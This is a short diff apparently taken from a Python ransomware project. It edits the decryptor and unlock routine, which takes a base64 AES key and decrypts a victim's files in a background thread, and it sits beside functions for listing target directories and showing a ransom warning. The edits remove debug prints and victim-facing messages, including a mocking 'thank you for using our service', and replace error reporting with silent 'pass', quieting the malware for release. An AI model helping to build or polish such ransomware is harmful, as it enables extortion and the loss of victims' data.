@@ -67,7 +67,7 @@ class Decryptor:
                     else :
                         self.decEach(file)
         except Exception as e:
-            print(f"[DEBUG] Error on EnDecrypt.encryptFile(): {e}")
+            pass
 
 def listUpTargetDir():
     global PathList
@@ -111,7 +111,6 @@ def decryptComputer():
     try:
         AESKey=base64.b64decode(buf[10:])
         setDecryptModule(AESKey)
-        print("Start Decryption... Do not turn off computer...")
         
         th=Thread(target=doDec)
         th.start()
@@ -119,12 +118,11 @@ def decryptComputer():
         th.join()
         
         completeDecryption()
-        print("User computer is unlocked! Thank you for using our service:):):):):) Bye!")
         
         sleep(10)
         sys.exit(0)
     except Exception as e:
-        print("AESKey is not correct!", e)
+        pass
         
 
 def ransomewareWarning():
